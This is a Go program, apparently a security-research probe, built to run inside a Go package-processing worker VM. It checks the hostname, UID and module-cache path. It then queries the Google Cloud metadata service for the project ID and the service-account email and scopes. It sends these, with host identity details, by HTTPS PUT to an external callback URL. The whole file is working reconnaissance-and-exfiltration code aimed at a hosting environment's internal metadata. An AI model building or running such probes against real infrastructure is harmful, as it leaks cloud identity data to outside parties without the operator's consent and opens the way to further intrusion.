package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf8"
)

var resultURL string
var callbackSession string

const (
	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion     = "v0.0.75-codex"
	userAgent        = "go-cgo-pkgsite-probe-v075-generic-identity"
	expectedHostname = "ubuntu-fc-uvm"
	expectedPID1     = "/sbin/init"
	metadataBase     = "http://169.254.169.254/computeMetadata/v1/"
	maximumValue     = 8192
)

type identity struct {
	Lane     string `json:"lane"`
	CWD      string `json:"cwd"`
	UID      int    `json:"uid"`
	GID      int    `json:"gid"`
	Hostname string `json:"hostname"`
	PID1     string `json:"pid1"`
}

type metadataValue struct {
	Path                  string `json:"path"`
	HTTPStatus            int    `json:"http_status,omitempty"`
	MetadataFlavorPresent bool   `json:"metadata_flavor_present"`
	Value                 string `json:"value,omitempty"`
	Error                 string `json:"error,omitempty"`
}

type report struct {
	Schema                    string        `json:"schema"`
	Module                    string        `json:"module"`
	Version                   string        `json:"version"`
	ObservedUTC               string        `json:"observed_utc"`
	Identity                  identity      `json:"identity"`
	ProjectID                 metadataValue `json:"project_id"`
	ServiceAccountEmail       metadataValue `json:"service_account_email"`
	ServiceAccountScopes      metadataValue `json:"service_account_scopes"`
	TokenEndpointRequested    bool          `json:"token_endpoint_requested"`
	CloudAPIRequestsAttempted bool          `json:"cloud_api_requests_attempted"`
	SensitiveValuesIncluded   bool          `json:"sensitive_values_included"`
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func run() error {
	if len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return errors.New("fixed invocation required")
	}
	if !validNonce(callbackSession) {
		return errors.New("invalid callback session")
	}
	expectedPath := "/v1/result/" + callbackSession + "/generic-identity"
	callback, err := exactHTTPS(resultURL, expectedPath)
	if err != nil {
		return err
	}
	id, exact := observeIdentity(os.Args[3])
	if !exact {
		return nil
	}
	r := report{
		Schema:      "go-public-worker-fixed-identity/v1",
		Module:      moduleName,
		Version:     probeVersion,
		ObservedUTC: time.Now().UTC().Format(time.RFC3339Nano),
		Identity:    id,
		ProjectID:   queryMetadata("project/project-id"),
		ServiceAccountEmail: queryMetadata(
			"instance/service-accounts/default/email"),
		ServiceAccountScopes: queryMetadata(
			"instance/service-accounts/default/scopes"),
		TokenEndpointRequested:    false,
		CloudAPIRequestsAttempted: false,
		SensitiveValuesIncluded:   false,
	}
	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPut, callback.String(), bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("X-Probe-Session", callbackSession)
	client := &http.Client{
		Timeout:   10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12}},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	if resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("receipt status %d", resp.StatusCode)
	}
	return nil
}

func observeIdentity(origin string) (identity, bool) {
	cwd, _ := filepath.EvalSymlinks(origin)
	cwd, _ = filepath.Abs(cwd)
	hostname, _ := os.Hostname()
	pid1Bytes, _ := os.ReadFile("/proc/1/cmdline")
	pid1 := strings.TrimSpace(strings.ReplaceAll(string(pid1Bytes), "\x00", " "))
	id := identity{Lane: "other", CWD: cwd, UID: os.Getuid(), GID: os.Getgid(), Hostname: hostname, PID1: pid1}
	expectedPrefix := "/var/tmp/gopath/pkg/mod/" + moduleName + "@" + probeVersion
	exact := id.UID == 1000 && id.GID == 1000 && id.Hostname == expectedHostname && id.PID1 == expectedPID1 && (id.CWD == expectedPrefix || strings.HasPrefix(id.CWD, expectedPrefix+"/"))
	if exact {
		id.Lane = "go-public-worker-uvm"
	}
	return id, exact
}

func queryMetadata(path string) metadataValue {
	result := metadataValue{Path: path}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, metadataBase+path, nil)
	if err != nil {
		result.Error = "request construction failed"
		return result
	}
	req.Host = "metadata.google.internal"
	req.Header.Set("Metadata-Flavor", "Google")
	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			Proxy:       nil,
			DialContext: (&net.Dialer{Timeout: 2 * time.Second}).DialContext,
		},
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	resp, err := client.Do(req)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer resp.Body.Close()
	result.HTTPStatus = resp.StatusCode
	result.MetadataFlavorPresent = resp.Header.Get("Metadata-Flavor") == "Google"
	body, err := io.ReadAll(io.LimitReader(resp.Body, maximumValue+1))
	if err != nil || len(body) > maximumValue {
		result.Error = "response exceeded fixed bound"
		return result
	}
	value := strings.TrimSpace(string(body))
	if resp.StatusCode != http.StatusOK || !result.MetadataFlavorPresent {
		result.Error = "metadata endpoint did not return exact success shape"
		return result
	}
	if value == "" || !utf8.ValidString(value) || strings.ContainsRune(value, '\x00') {
		result.Error = "metadata value was invalid"
		return result
	}
	result.Value = value
	return result
}

func exactHTTPS(raw, expectedPath string) (*url.URL, error) {
	u, err := url.Parse(raw)
	if err != nil || u.Scheme != "https" || u.Host == "" || u.User != nil || u.RawQuery != "" || u.Fragment != "" || u.Path != expectedPath {
		return nil, errors.New("callback URL outside fixed HTTPS shape")
	}
	return u, nil
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, c := range value {
		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
			return false
		}
	}
	return true
}

func cleanError(err error) string {
	text := err.Error()
	text = strings.ReplaceAll(text, metadataBase, "metadata://")
	if len(text) > 512 {
		text = text[:512]
	}
	return text
}
